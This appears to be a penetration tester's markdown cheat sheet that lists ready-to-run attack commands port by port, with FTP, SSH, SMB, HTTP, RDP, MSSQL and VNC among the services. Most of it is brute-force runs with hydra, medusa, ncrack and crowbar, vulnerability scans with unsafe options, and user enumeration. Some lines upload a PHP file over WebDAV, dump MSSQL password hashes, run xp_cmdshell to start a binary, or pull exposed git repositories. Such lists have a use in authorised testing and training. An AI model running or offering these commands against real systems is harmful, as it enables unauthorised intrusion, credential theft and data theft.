# Sources
https://guif.re/networkpentest
All commands are to be run against:
* export TARGET=<IP>
* export PORT=<PORT>
* export URL=http://$TARGET:$PORT
* export URLS=https://$TARGET:$PORT
# 21 FTP
```bash
nmap -sV -Pn -vv -p21 --script=ftp-anon,ftp-bounce,ftp-libopie,ftp-proftpd-backdoor,ftp-syst,ftp-vsftpd-backdoor,ftp-vuln-cve2010-4221 $TARGET
```

# 22 - SSH
Check lockout policy
```bash
cat /etc/pam.d/system-auth
cat /etc/pam.d/password-auth
```
if okay, start brute forcing for fun
```bash
medusa -u $USER -P /usr/share/wordlists/rockyou.txt -e ns -h $TARGET - 22 -M ssh
hydra -s 22 -v -l $USER -P /usr/share/wordlists/rockyou.txt -e nsr -t 4 $TARGET ssh
ncrack -vv -p 22 --user $USER -P /usr/share/wordlists/rockyou.txt $TARGET
```
Check for weak diffie-hellman groups
```
https://github.com/GDSSecurity/SSH-Weak-DH
```

# 25 SMTP
```bash
# find users
smtp-user-enum -M VRFY -U /usr/share/seclists/Usernames/top-usernames-shortlist.txt -t $TARGET -p 25

# brute force, #auth type from nmap default scripts or telnet > EHLO world
hydra -L users.txt -P /usr/share/wordlists/rockyou.txt smtp://10.11.1.115/CRAM-MD5
```

# 53 DNS Lookup Range
```bash
dig.sh <ips.txt>

for ip in $(cat ips.txt); do nslookup $ip <nameserver>; done
```

# 69 UDP TFTP
```bash
nmap -n -vvv -d -sU -p69 $TARGET --script tftp-enum.nse --script-args tftp-enum.filelist=/usr/share/wordlists/metasploit/tftp.txt
```
# 80/443 - HTTP Server Information
```bash
nmap -n -v -p 80,443,8080 -T4 -PN -sVC --script http-vuln* --script-args=unsafe=1 $TARGET
nikto -h http://$TARGET -output 80_nikto.txt
whatweb -a 4 $target
skipfish 
curl -v -i $TARGET:80
w3m -dump $TARGET/robots.txt | tee 80_robots.txt
VHostScan -t $TARGET -oN 80_vhosts.txt

# waf detection
wafw00f $TARGET
nmap -p80 --script http-waf-fingerprint $TARGET

# webdav
davtest -url $TARGET
curl -vv -X PUT http://$TARGET/october --data-binary '@wb.php'

# Web Server
clusterd -a $TARGET
nmap -p80 --script=ajp-* $TARGET
jboss-win $TARGET $PORT
jboss-linux $TARGET $PORT


# cms
BlindElephant.py $TARGET [guess|specific_app_name]
wafp
wpscan --url http://$TARGET/blog --enumerate ap,at -t 16
droopescan scan drupal -u http://$TARGET -t 32
joomscan -u http://$TARGET/
namp -p 80 --script http-drupal-enum $TARGET

# brute force username/passwords
wpscan --url http://$TARGET -P /usr/share/wordlists/rockyou.txt -U admin
```

## 80/443 - HTTP Discovery
[ffuz process](./fuzzing.md)
```bash

# direnum
dirb http://$TARGET:$PORT/ -o $PORT_dirb.txt
dirbuster -H -u http://$TARGET:$PORT/ -l /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -t 20 -s / -v -r $PORT_dirbuster_medium.txt
gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -u http://$TARGET:$PORT/ -s '200,204,301,302,307,403,500' -e | tee "$PORT_gobuster_common.txt"
gobuster dir -w /usr/share/seclists/Discovery/Web-Content/RobotsDisallowed-Top1000.txt -u http://$TARGET:$PORT/ -s '200,204,301,302,307,403,500' -e | tee "$PORT_gobuster_toprobots.txt"
gobuster dir -w /usr/share/seclists/Discovery/Web-Content/CGIs.txt -u http://$TARGET:$PORT/ -s '200,204,301,307,403,500' -e  | tee "$PORT_gobuster_cgis.txt"

# Fuzz JSON
```bash
ffuf -w fuzzdb/attack/sql-injection/detect/xplatform.txt -X POST -H 
<HEADERS> -d '{"email":"FUZZ","password":"ndnd"}' -u http://$TARGET:$PORT/rest/user/login -v -fc 401
```
[ffuz process](./fuzzing.md)

# 88 Kerberos
```bash
nmap -p88 --script=krb5-enum-users --script-args krb5-enum-users.realm="$DOMAIN.local",userdb=/usr/share/seclists/Usernames/Names/names.txt $TARGET

nmap -n -v -p 88 --script krb5-enum-users -sV 10.11.1.201 -d --script-args krb5-enum-users.realm='corp',userdb=cirt-default-usernames.txt
```

# 111/2049 NFS/RSTAT/NIS
```bash
showmount -e $TARGET
nmap -sV -p111,2049 --script=nfs-showmount $TARGET
nmap -p 111,2049 --script=nfs-ls $TARGET
nmap -p 111,2049 --script=nfs-statfs $TARGET

rsysinfo $TARGET

apt-get install nis
ypwhich -d example.org $TARGET
ypcat -d example.org -h $TARGET passwd.byname

#mounting
mkdir /tmp/mount
mount -t nfs -o nolock 10.10.10.10:/nfs/path /tmp/mount
```

# 139/445 SMB
```bash
nmap -n -v -p 135-139,445 -T4 -PN -sVC --script default,exploit,version,vuln --script-args=unsafe=1 $TARGET
nmap -n -v -p 135-139,445 -T4 -PN -sVC --script=smb-vuln* --script-args=unsafe=1 $TARGET
nmblookup -A $TARGET
smbclient //MOUNT/share -I $TARGET N
smbclient -L //$TARGET
enum4linux -a $TARGET
rpcclient -U "" $TARGET
rcpcliebt>enumdomusers
rpcdump.py $TARGET

# Getting the smb version when other methods fail (or port 139 is only available)
ngrep -i -d tap0 's.?a.?m.?b.?a.*[[:digit:]]' port 139

# brute -l = individual user
hydra -l manager -P /usr/share/wordlists/rockyou.txt $TARGET smb
or - L = list of users
hydra -L users.txt -P /usr/share/wordlists/rockyou.txt smb://10.11.1.115/

# helpful resource
https://0xdf.gitlab.io/2018/12/02/pwk-notes-smb-enumeration-checklist-update1.html
```

# 161 SNMP
v1/2
```bash
snmpwalk -v 2c -c public $TARGET
```

v3
```bash
# enumerate usernames
snmpv3enum.rb -i $TARGET -u usernames

# brute
hydra -U snmp
```

# 389 LDAP
```bash
nmap -n -v -p 389 --script ldap-rootdse.nse -sV 10.11.1.201

nmap -n -v -p 389 --script ldap-search.nse -sV 10.11.1.201

ldapsearch -D "cn=admin" -w secret123 -p 389 -h 10.10.10.10 -s base -b "ou=people,dc=orachrvile,dc=com" "objectclass=*"

# brute
nmap -p 389 --script ldap-brute --script-args ldap.base='"cn=users,dc=cqure,dc=net"' <host>
```

## 443 - HTTPS Only
```bash
# inspect certificate
openssl s_client -connect $target:443

# get TLS versions by server
git clone https://github.com/WestpointLtd/tls_prober
cd tls_prober && git submodule update --init
./prober.py $target

# known keys used
nmap -p 443 --script ssl-known-key $target
```
# 1038 ruserd
```bash
apt-get install rusers
rusers -l 10.10.10.10
```
## 3389 RDP
```bash
# brute force
ncrack -vv --user administrator -P PASS_LIST rdp://$TARGET
crowbar -b rdp -u -s $TARGET -U USER_LIST -C PASS_LIST
for username in $(cat USER_LIST); do for password in $(cat PASS_LIST) do; rdesktop -u $username -p $password $TARGET; done; done;
```

## 1433/27900 MSSQL
```bash
nmap -vv -sV -Pn -p 1433,27900 --script=ms-sql-info,ms-sql-config,ms-sql-dump-hashes --script-args=mssql.instance-port=27900,mssql.username=sa,mssql.password=sa $TARGET

nmap -n -v -p 1433,27900 $TARGET -sTV -PN --script ms-sql-xp-cmdshell --script-args mssql.username=sa,mssql.password=poiuytrewq,ms-sql-xp-cmdshell.cmd="c:\ralph.exe"

nmap -n -v -p 1433,27900 $TARGET -sV --script ms-sql-query.nse --script-args mssql.username=sa,mssql.password=password,ms-sql-query.query="SELECT * FROM tblCustomers",mssql.database=tblCustomers

```

## Various high ports Windows DCE
```bash
rpcdump.py

/usr/share/spike/dcedump/ifids -p ncadg_ip_tcp -e 1025 10.10.10.10
```

https://l.wzm.me/_security/internet/_internet/WinServices/index.html

## 3128,8080/various Proxies (squid, etc)
https://tools.kali.org/maintaining-access/httptunnel
```bash
#Connect to the proxy and scan whats available behind it:
#htc -F <local-port> <address>:<proxy-port>
htc -F 80 10.10.11.31:3128
curl -vv http://127.0.0.1:80

# scan (or run any command over the proxy chains) through the proxy with proxychains
htc -F 9050 10.10.11.31:3128
proxychains nmap -sTVC -p- 10.10.11.31
```

## 5900 VNC
VNC passwords are 8 >= characters long. Tailor dictionary to this
```bash
# vuln
nmap -n -v -p 5900 -sV -T4 -PN --script realvnc*,vnc-info*,vnc-title* $TARGET
# Find public exploits
searchsploit vnc
# Bruteforcing
crowbar -b vnckey -s 10.11.1.73/32 -p IP -k PASS_FILE
```

## SVN/GIT Repos
```bash
# download all svn repos
https://github.com/lanjelot/pillage-svn

# remote exposed git repo
https://github.com/evilpacket/DVCS-Pillage
gitpillage.sh

# secrets in the downkoaded repo
https://github.com/dxa4481/truffleHog
```
